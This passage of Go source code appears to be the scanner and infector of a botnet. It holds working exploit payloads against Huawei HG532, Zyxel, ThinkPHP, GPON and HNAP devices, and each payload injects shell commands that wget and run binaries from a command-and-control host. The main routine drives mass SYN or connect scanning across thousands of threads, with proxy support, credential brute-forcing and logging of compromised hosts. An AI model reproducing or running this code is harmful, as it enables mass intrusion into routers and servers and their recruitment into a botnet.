	if isAuthFailure(resp) {
		return false
	}
	return isAuthSuccess(resp) || len(strings.TrimSpace(resp)) == 0
}

func tryHuaweiExploit(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:37215", ip), time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	payload := "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g " + c2Host + " -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	return n > 0
}

func tryZyxelExploit(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:8080", ip), 500*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	payload := "POST /cgi-bin/ViewLog.asc HTTP/1.1\r\nHost: " + ip + "\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: python-requests/2.20.0\r\nContent-Length: 227\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n /bin/busybox wget http://" + c2Host + "/8UsA.sh; chmod +x 8UsA.sh; sh 8UsA.sh"
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	return n > 0
}

func tryThinkPHPExploit(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:80", ip), 500*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	payload := "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://" + c2Host + "/bins/x86 -O thinkphp ; chmod 777 thinkphp ; ./thinkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Uirusu/2.0\r\n\r\n"
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	return n > 0
}

func tryGpon80Exploit(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:80", ip), 500*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	payload := "GET /GponForm/diag_Form?script/%3C%25+echo+shell_exec%28\"cd+/tmp%3Bwget+http://" + c2Host + "/gpon80+%22%29+--%3E&port=80&host=google.com HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	return n > 0
}

func tryHnapExploit(ip string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:80", ip), 500*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	payload := "GET / HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\nGET /hnap70ecf03112d9b7286aca1f85b918d6b HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
	conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	return n > 0
}

func main() {
	threads := 5000
	threadsFromArg := false
	useProxy := false
	proxyPath := ""
	outputFile := "../infector/scan_results.txt"

	for _, arg := range os.Args[1:] {
		if t, err := strconv.Atoi(arg); err == nil && t > 0 {
			threads = t
			threadsFromArg = true
		} else if arg == "noproxy" || arg == "no_proxy" {
			useProxy = false
		} else if arg == "proxy" || arg == "noconnect" {
			useProxy = true
		} else if arg == "connect" || arg == "tcp" {
			useProxy = false
		} else if strings.HasPrefix(arg, "proxy:") {
			useProxy = true
			proxyPath = strings.TrimPrefix(arg, "proxy:")
		} else if strings.HasPrefix(arg, "-o:") || strings.HasPrefix(arg, "--output:") {
			outputFile = strings.TrimPrefix(arg, "-o:")
			outputFile = strings.TrimPrefix(outputFile, "--output:")
		} else if strings.HasPrefix(arg, "-o=") || strings.HasPrefix(arg, "--output=") {
			outputFile = strings.TrimPrefix(arg, "-o=")
			outputFile = strings.TrimPrefix(outputFile, "--output=")
		} else if strings.HasPrefix(arg, "c2:") {
			c2Host = strings.TrimPrefix(arg, "c2:")
		}
	}

	if outputFile != "" {
		resultsFile = outputFile
	}

	// Try to load C2 host from config.json if not set via CLI
	if !strings.Contains(c2Host, ":") {
		cwd, _ := os.Getwd()
		configPaths := []string{
			cwd + "/../src/config.json",
			cwd + "/../../src/config.json",
			"/tmp/config.json",
		}
		for _, cp := range configPaths {
			if data, err := os.ReadFile(cp); err == nil {
				var cfg map[string]interface{}
				if jsonErr := json.Unmarshal(data, &cfg); jsonErr == nil {
					if ph, ok := cfg["public_host"].(string); ok && ph != "" {
						c2Host = ph
					}
				}
				break
			}
		}
	}

	if useProxy && proxyPath == "" {
		proxyPath = promptInput("Proxy file path: ")
	}

	if useProxy && proxyPath != "" {
		proxyList = loadProxies(proxyPath)
	} else if !useProxy {
		cwd, _ := os.Getwd()
		paths := []string{
			cwd + "/../core/free-proxy-list.txt",
			cwd + "/free-proxy-list.txt",
			"/tmp/free-proxy-list.txt",
		}
		for _, p := range paths {
			if _, err := os.Stat(p); err == nil {
				proxyList = loadProxies(p)
				break
			}
		}
	}

	rand.Seed(time.Now().UnixNano())
	crand.Read(secretKey)
	lcgState = rand.Uint32() | 1

	foundChan := make(chan string, 1000)
	scanResultChan := make(chan ScanResult, 1000)
	stopChan := make(chan struct{})

	// Batch disk writer — drains resultQueue asynchronously, no per-hit file I/O
	go batchWriter(stopChan)

	go func() {
		for {
			select {
			case <-stopChan:
				return
			case result := <-foundChan:
				handleRawResult(result)
			case result := <-scanResultChan:
				handleResult(result)
			}
		}
	}()

	fmt.Printf("\n[FAST-SCANNER] Starting SYN scanner -> Threads: %d, Results: %s\n", threads, resultsFile)
	fmt.Println("[FAST-SCANNER] Select scanning mode:")
	fmt.Println("  1. Fast scanning (pcap/SYN — requires Npcap)")
	fmt.Println("  2. Normal scanning (TCP connect)")
	mode := promptInput("Mode [1/2] (default 1): ")
	if mode == "" {
		mode = "1"
	}

	if !threadsFromArg {
		threadInput := promptInput(fmt.Sprintf("Threads (default %d): ", threads))
		if threadInput != "" {
			if t, err := strconv.Atoi(threadInput); err == nil && t > 0 {
				threads = t
			}
		}
	}

	p, err := openPcap()
	useRaw := err == nil
	rawActive := int32(1)
	if len(proxyList) > 0 {
		fmt.Printf("[FAST-SCANNER] Proxies loaded: %d\n", len(proxyList))
	}

	if mode == "2" {
		useRaw = false
		fmt.Printf("[FAST-SCANNER] Normal TCP connect scanning mode\n")
	} else if useRaw {
		fmt.Printf("[FAST-SCANNER] gopacket/pcap capture ready - stateless SYN scanning with cookie verification\n")
		log.Printf("[FAST-SCANNER] pcap handle (LinkType=%s) ready - stateless SYN scanning mode\n", p.LinkType())
		go synReceiver(p, foundChan, stopChan)
	} else {
		log.Printf("[FAST-SCANNER] pcap failed (%v) - falling back to connect scanning mode\n", err)
	}

	// Limit threads for connect mode to avoid exhaustion
	activeThreads := threads
	if !useRaw && activeThreads > 2000 {
		activeThreads = 2000
	}

	for i := 0; i < activeThreads; i++ {
		if useRaw {
			go scannerWorker(stopChan, foundChan, &rawActive, p)
		} else {
			go scannerWorkerConnect(stopChan, &rawActive, scanResultChan)
		}
	}

	go func() {
		for {
			select {
			case <-stopChan:
				return
			default:
			}
			elapsed := time.Since(startTime).Seconds()
			log.Printf("[FAST-SCANNER] Scanned: %d | Creds: %d | Exploits: %d | Elapsed: %.1fs\n",
				atomic.LoadInt64(&scannedIPs), atomic.LoadInt64(&foundCreds), atomic.LoadInt64(&foundExps), elapsed)
			time.Sleep(1 * time.Second)
		}
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	<-sigChan

	fmt.Println("\n[FAST-SCANNER] Stopping scanner. Results saved to", resultsFile)
	close(stopChan)
	time.Sleep(1 * time.Second)
	close(resultQueue) // Signal batchWriter to flush and exit

	elapsed := time.Since(startTime).Seconds()
	fmt.Printf("\n[FAST-SCANNER] Bruteforce Summary:\n")
	fmt.Printf("  Passwords tried : %d\n", atomic.LoadInt64(&passwordsTried))
	fmt.Printf("  Successes       : %d\n", atomic.LoadInt64(&bruteSuccess))
	fmt.Printf("  Failures        : %d\n", atomic.LoadInt64(&bruteFailed))
	fmt.Printf("  Elapsed         : %.1fs\n", elapsed)
	fmt.Print("\n[FAST-SCANNER] Press Enter to exit...")
	bufio.NewReader(os.Stdin).ReadString('\n')
}

